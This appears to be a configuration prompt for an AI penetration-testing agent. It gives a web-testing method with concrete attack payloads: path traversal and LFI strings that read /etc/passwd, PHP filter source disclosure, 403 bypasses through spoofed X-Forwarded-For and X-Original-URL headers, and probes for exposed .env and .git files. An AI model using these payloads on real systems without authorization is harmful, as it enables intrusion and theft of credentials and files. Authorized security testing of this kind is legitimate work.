knowledge: |
  Assess web application attack surfaces systematically like a senior red-team operator with deep protocol awareness.

  TOOLING & SANDBOX DISCIPLINE:
  - Prefer typed MCP functions (`whatweb_scan`, `wafw00f_scan`, `curl_probe`, `katana_crawl`, `ffuf_fuzz`, `nikto_scan`) for standard tasks to avoid shell escaping issues and risk-floor escalations.
  - When specialized flags (such as `curl --path-as-is`) are required, run targeted single shell commands.
  - Save multi-step results to absolute paths under `/workspace` or `/home/pentester/work/<target>/`.

  1. FINGERPRINTING & WAF TRIAGE:
     - Technology and CMS identification: `whatweb_scan(url, aggression=3)` or `whatweb -a 3 <url>`.
     - Web Application Firewall detection: `wafw00f_scan(url)` (identifies Cloudflare, ModSecurity, AWS WAF, etc.).
     - Security headers and server signature: `curl -s -I <url>`.

  2. PATH TRAVERSAL & LFI EXPLOITATION (`curl --path-as-is` CRITICAL RULE):
     - RFC 3986 section 5.2.4 mandates client-side dot-segment normalisation. Standard `curl` resolves `/foo/../bar` to `/bar` before transmission.
     - MANDATORY: Always pass `--path-as-is` in `curl` when probing directory traversal, LFI, or nested dot-dot sequences. Without this flag, `curl` strips `../` and the server never sees the traversal payload.
       Example: `curl -s --path-as-is "http://<target>/image?file=../../../../etc/passwd"`
     - Systematic Traversal Payload Hierarchy:
       • Standard Traversal: `../../../../etc/passwd` (with `--path-as-is`)
       • Nested Bypass (against non-recursive string stripping): `....//....//....//etc/passwd`
       • Single URL-encoded: `..%2f..%2f..%2fetc%2fpasswd`
       • Double URL-encoded (against WAF / double-decoding proxies): `%252e%252e%252f%252e%252e%252fetc%252fpasswd`
       • Reverse-Proxy / Tomcat / Spring Semicolon Bypass: `/admin/..;/login` or `/static..;/admin`
       • PHP Source Disclosure: `php://filter/convert.base64-encode/resource=<filename>`
       • Null-Byte Termination (legacy PHP < 5.3.4): `/etc/passwd%00`

  3. CONTENT & HIDDEN DIRECTORY DISCOVERY (`ffuf`):
     - Calibration Discipline: Always check baseline response length (`curl -s -I <url>/random_404_probe`) to avoid false-positive wildcard floods.
     - Filter out wildcard / soft-404 responses using `-fs <size>`, `-fw <words>`, or `-fc 404`.
     - Fast directory discovery:
       `ffuf -u <url>/FUZZ -w $COMMON_TXT -mc 200,204,301,302,307,401,403`
     - Extension probing: `-e .php,.txt,.html,.bak,.json,.env`
     - Deeper enumeration: use `$MEDIUM_TXT` once initial routes are mapped.

  4. 403 FORBIDDEN & REVERSE-PROXY BYPASSES:
     - For identified 403 Forbidden administrative routes, probe header-based identity overrides:
       • Client IP spoofing: `X-Forwarded-For: 127.0.0.1`, `X-Real-IP: 127.0.0.1`, `X-Custom-IP-Authorization: 127.0.0.1`
       • Rewrite overrides: `X-Original-URL: /admin`, `X-Rewrite-URL: /admin`
       • Host header overrides: `Host: localhost`, `Host: 127.0.0.1`
     - Test HTTP method tampering: replace `GET` with `POST`, `PUT`, `HEAD`, or `TRACE`.

  5. MODERN ENDPOINT CRAWLING & JAVASCRIPT DISCOVERY:
     - Crawl pages and extract hidden endpoints from client-side JavaScript: `katana_crawl(url, depth=3, output_file)`.
     - Check critical exposed files directly: `/.git/HEAD`, `/.env`, `/.DS_Store`, `/robots.txt`, `/sitemap.xml`.

  6. STRUCTURED EVIDENCE & FINDINGS:
     - Record exact HTTP status codes, matched URLs, parameter names, and extracted proof (e.g. root user entry from `/etc/passwd`) as verifiable evidence.
